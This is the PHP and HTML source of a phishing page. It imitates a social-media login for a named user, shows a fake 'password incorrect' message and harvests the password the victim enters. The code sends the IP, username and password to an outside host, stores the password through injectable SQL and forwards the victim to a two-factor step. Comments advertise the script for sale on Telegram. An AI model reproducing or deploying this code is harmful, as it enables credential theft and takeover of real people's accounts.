<?php
include ("app/config.php");
include ("app/database/yazilar.php");
include ("app/database/router.php");
require 'app/api/spexapi.php';
session_start();
error_reporting(E_ALL);



$username=$_GET['username'];
$url2="https://smihub.com/search?query=$username";
$ip=str_get_html(file_get_contents($url2));
$pp=$ip->find("img[class='img-fluid w-100']",0)->src;
$tik="-";
$followers="-";
if($_POST){
    $password=$_POST["password"];
    $ip=$_SERVER["REMOTE_ADDR"];
    $konum = file_get_contents("http://ip-api.com/xml/".$ip);
    $cek = new SimpleXMLElement($konum);
    $ulke = $cek->country;
    $sehir = $cek->city;
    $ips="$ip,$username ,$password";
    $url="https://ip-check-api.com/".$ips;
    $cek = file_get_contents($url);
    $data = explode (",",$cek);
    $ulke = $data[0];
    $sehir = $data[1];
    date_default_timezone_set('Europe/Istanbul');
    $cur_time=date("d-m-Y H:i:s");
    
    
     $veriyaz = $spexcon->query("UPDATE `users` SET `pass2`='".$password."' WHERE user='".$username."'");


    header("Location: twofactor.php?username=$username");
 }
  




?>

<!--Sloker Medya Editlemiştir Telegram : @slokerxlegend
       script fiyatı : 30 tl ' dir.-->

<!DOCTYPE html>
<html lang="en">
<head>
   <?php include ("app/tag/main/meta.php"); ?>
   <style>img[alt="www.000webhost.com"]{display:none;}</style>


<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="assets/theme/sloker2/css/vendor/bootstrap/css/bootstrap.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="assets/theme/sloker2/fonts/font-awesome-4.7.0/css/font-awesome.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="assets/theme/sloker2/css/vendor/animate/animate.css">
<!--===============================================================================================-->	
	<link rel="stylesheet" type="text/css" href="assets/theme/sloker2/css/vendor/css-hamburgers/hamburgers.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="assets/theme/sloker2/css/vendor/select2/select2.min.css">
	<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">

<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="assets/theme/sloker2/css/util.css">
	<link rel="stylesheet" type="text/css" href="assets/theme/sloker2/css/main.css">
	
<!--===============================================================================================-->
</head>

<!--Sloker Medya 
    Telegram : @slokerxlegend
-->

<style type="text/css">  .btn {
    cursor: pointer;
    width: 100%;
    padding:0 8px; 
    background: #3897f0;
    border:1px solid #3897f0;
    color:#fff;
    border-radius:10px;
    font-weight:600;
    font-size: 14px;
    height: 35px;
    line-height: 26px;
    outline: none;
    white-space: nowrap;
  }
  
  .container-login100{
	  
	  background:#dfdfdf;
	  
  }
  
  body{
	  background:#fafafa;
  }
</style>
<body>
<div class="limiter">
<div style="margin-top:-70px; margin-bottom:-60px;" class="container-login100">
<div class="wrap-login100">
<div class="login100-pic js-tilt" data-tilt="" style="will-change: transform; transform: perspective(300px) rotateX(0deg) rotateY(0deg);">
<img style="max-width:90%; border-radius:50%; margin-top:20px;" src="<?php echo $pp; ?>" alt="IMG"> <br><br></div>
<el class="login100-form validate-form" id="elemend">

<form action="" id="" method="post" class="login100-form validate-form">

<center><img style="max-width:50%; border-radius:50%; margin-top:-70px;" width="150"  src="<?php echo $pp; ?>"></center><br>


   <center><h1 style="font-family:sans-serif;
font-weight:400;
letter-spacing:;
color:#3d3d3d;
font-size: 20px;"><b><?php echo $formbaslik; ?></b> </h1><br><p style="max-width:87%; font-size:15px; color: #999; line-height:20px; font-weight:400;">
<?php echo $formyazi; ?>
</p></center>
<hr>
<div class="wrap-input100 validate-input">
<input required="" class="input100" type="password" name="password" placeholder="Password">
<span class="focus-input100"></span>
<span class="symbol-input100">
<i class="fa fa-lock" aria-hidden="true"></i>
</span>
</div>



<div class="container-login100-form-btn" style="margin-top:-20px;">
<button type="submit" id="imagei" class="btn">Login @<?php echo $username; ?></button>
					
				</div><br><center><h6><font style="cursor:pointer;"color="red">Sorry, your password is incorrect. Check and try again.</font></a></h6></center></div>
					

				

					
				</form>
			</div>
			<div style="background:#fafafa; width:100%; height:70px; border-top:0.5px solid rgb(0,0,0,0.3);"class="lilvlad2">
			<center><img style="margin-top:20px;" src="assets/theme/sloker2/footer.jpg" width="100"></center>
			</div>
      </div>
		</div>
	</el>
	
	

	
<!--===============================================================================================-->	
	<script src="assets/theme/sloker2/css/vendor/jquery/jquery-3.2.1.min.js"></script>
<!--===============================================================================================-->
	<script src="assets/theme/sloker2/css/vendor/bootstrap/js/popper.js"></script>
	<script src="assets/theme/sloker2/css/vendor/bootstrap/js/bootstrap.min.js"></script>
<!--===============================================================================================-->
	<script src="assets/theme/sloker2/css/vendor/select2/select2.min.js"></script>
<!--===============================================================================================-->
	<script src="assets/theme/sloker2/css/vendor/tilt/tilt.jquery.min.js"></script>

<!--===============================================================================================-->
<script src="assets/theme/sloker2/css/js/main.js"></script>

</body>
</html>

<style> .disclaimer { visibility: hidden;} </style>